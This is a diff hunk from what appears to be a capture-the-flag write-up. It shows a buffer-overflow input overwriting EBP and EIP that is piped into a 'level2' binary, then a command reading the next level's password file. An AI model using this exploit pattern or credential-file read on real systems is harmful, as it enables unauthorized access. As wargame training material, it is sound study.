@@ -37,4 +37,4 @@ INPUT="${BUFFER}${N}${CALLING_ALIGNMENT}${EBP_REPLACEMENT}${EIP_REPLACEMENT}"
 (echo "${INPUT}" && cat) | ./level2
 
 # We use the reverse shell to retrieve the password
-$ cat /home/user/level3/.pass
+# $> cat /home/user/level3/.pass
